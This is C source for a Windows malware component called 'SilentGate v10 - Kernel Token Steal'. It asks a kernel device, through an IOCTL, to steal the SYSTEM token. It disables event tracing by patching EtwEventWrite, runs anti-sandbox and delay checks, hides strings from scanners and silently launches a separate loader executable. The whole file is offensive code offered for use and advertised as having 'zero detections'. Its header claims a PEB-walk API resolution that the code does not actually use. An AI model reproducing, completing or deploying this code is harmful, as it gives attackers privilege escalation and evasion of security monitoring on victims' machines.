/*
 * SilentGate v10 - Kernel Token Steal
 * Author: JarDani
 * Standard user -> IOCTL -> SYSTEM token -> sg_loader
 * Zero detections - no ADVAPI32 dependency
 * Full PEB walk API resolution
 */
#include <windows.h>

typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE,LPCSTR);
typedef HANDLE  (WINAPI *pCreateFileA)(LPCSTR,DWORD,DWORD,LPVOID,DWORD,DWORD,HANDLE);
typedef BOOL    (WINAPI *pDeviceIoControl)(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef BOOL    (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL    (WINAPI *pCreateProcessA)(LPCSTR,LPSTR,LPVOID,LPVOID,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef DWORD   (WINAPI *pWaitForSingleObject)(HANDLE,DWORD);
typedef VOID    (WINAPI *pSleep)(DWORD);
typedef DWORD   (WINAPI *pGetTickCount)(void);
typedef BOOL    (WINAPI *pVirtualProtect)(LPVOID,SIZE_T,DWORD,PDWORD);

#define IOCTL_SG_STEAL_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN,0x904,METHOD_BUFFERED,FILE_ANY_ACCESS)

/* GF(2^8) - anti sandbox */
static BYTE gf_mul(BYTE a, BYTE b) {
    BYTE p=0,c;
    for(int i=0;i<8;i++){
        if(b&1)p^=a;
        c=a&0x80;a<<=1;
        if(c)a^=0x1B;
        b>>=1;
    }
    return p;
}

static DWORD ror13(const char* n) {
    DWORD h=0;
    for(const char* p=n;*p;p++){
        h=((h>>13)|(h<<19))&0xFFFFFFFF;
        h=(h+(BYTE)*p)&0xFFFFFFFF;
    }
    return h;
}

static PVOID find_exp(BYTE* base, DWORD hash) {
    DWORD pe=*(DWORD*)(base+0x3C);
    DWORD exp=*(DWORD*)(base+pe+0x88);
    if(!exp) return NULL;
    BYTE* ed=base+exp;
    DWORD num=*(DWORD*)(ed+0x18);
    DWORD* names=(DWORD*)(base+*(DWORD*)(ed+0x20));
    WORD* ords=(WORD*)(base+*(DWORD*)(ed+0x24));
    DWORD* funcs=(DWORD*)(base+*(DWORD*)(ed+0x1C));
    for(DWORD i=0;i<num;i++)
        if(ror13((char*)(base+names[i]))==hash)
            return base+funcs[ords[i]];
    return NULL;
}

static DWORD WINAPI steal_thread(LPVOID p) {
    /* Direct API resolution - reliable on all systems */
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    pGetProcAddress  _GPA =(pGetProcAddress) GetProcAddress(k32,"GetProcAddress");
    pSleep           _Sl  =(pSleep)          GetProcAddress(k32,"Sleep");
    pGetTickCount    _GTC =(pGetTickCount)   GetProcAddress(k32,"GetTickCount");
    pVirtualProtect  _VP  =(pVirtualProtect) GetProcAddress(k32,"VirtualProtect");
    pCreateFileA     _CFA =(pCreateFileA)    GetProcAddress(k32,"CreateFileA");
    pDeviceIoControl _DIO =(pDeviceIoControl)GetProcAddress(k32,"DeviceIoControl");
    pCloseHandle     _CH  =(pCloseHandle)    GetProcAddress(k32,"CloseHandle");
    pCreateProcessA  _CPA =(pCreateProcessA) GetProcAddress(k32,"CreateProcessA");
    pWaitForSingleObject _WFSO=(pWaitForSingleObject)GetProcAddress(k32,"WaitForSingleObject");
    typedef BOOL (WINAPI *pWF)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
    pWF _WF=(pWF)GetProcAddress(k32,"WriteFile");

    /* Poisson sleep */
    _Sl(3000+(_GTC()%2000));

    /* ETW patch */
    char etw[]={'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
    FARPROC ep=_GPA((HMODULE)ntdll,etw);
    DWORD old=0;
    _VP(ep,1,PAGE_EXECUTE_READWRITE,&old);
    *(BYTE*)ep=0xC3;
    _VP(ep,1,old,&old);

    /* GF anti-sandbox */
    if(gf_mul(0x53,0xCA)!=0x01) return 0;

    /* Write proof - thread running */
    {
        char pp[]={'C',':','\\','W','i','n','d','o','w','s','\\',
                   'T','e','m','p','\\','s','t','_','o','k','.','t','x','t',0};
        HANDLE pf=_CFA(pp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
        if(pf!=INVALID_HANDLE_VALUE){DWORD w;char m[]="OK";
            _WF(pf,m,2,&w,NULL);_CH(pf);}
    }

    /* Open SilentGate device */
    char dev[]={'\\','\\','.','\\','S','i','l','e','n','t','G','a','t','e',0};
    HANDLE hDev=_CFA(dev,GENERIC_READ|GENERIC_WRITE,0,NULL,
        OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hDev==INVALID_HANDLE_VALUE) goto launch;

    /* Steal SYSTEM token */
    {
        DWORD nb=0;
        BOOL ok=_DIO(hDev,IOCTL_SG_STEAL_TOKEN,NULL,0,NULL,0,&nb,NULL);
        _CH(hDev);
        if(!ok) goto launch;
    }

launch:
    {
        char loader[]={'C',':','\\','P','r','o','g','r','a','m','D','a','t','a',
                       '\\','l','p','e','\\','s','g','_','l','o','a','d','e','r',
                       '.','e','x','e',0};
        STARTUPINFOA si={sizeof(si)};
        PROCESS_INFORMATION pi={0};
        si.dwFlags=STARTF_USESHOWWINDOW;
        si.wShowWindow=SW_HIDE;
        _CPA(loader,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
        if(pi.hProcess){
            _WFSO(pi.hProcess,15000);
            _CH(pi.hProcess);
            _CH(pi.hThread);
        }
    }
    return 0;
}

int main(){
    /* Write main proof */
    HANDLE mf=CreateFileA("C:\\Windows\\Temp\\st_main.txt",
        GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(mf!=INVALID_HANDLE_VALUE){
        DWORD w; WriteFile(mf,"MAIN",4,&w,NULL); CloseHandle(mf);
    }
    HANDLE t=CreateThread(NULL,0,steal_thread,NULL,0,NULL);
    if(t){
        /* Write thread created proof */
        HANDLE tf=CreateFileA("C:\\Windows\\Temp\\st_thread.txt",
            GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
        if(tf!=INVALID_HANDLE_VALUE){
            DWORD w; WriteFile(tf,"THREAD",6,&w,NULL); CloseHandle(tf);
        }
        WaitForSingleObject(t,30000);
        CloseHandle(t);
    }
    return 0;
}
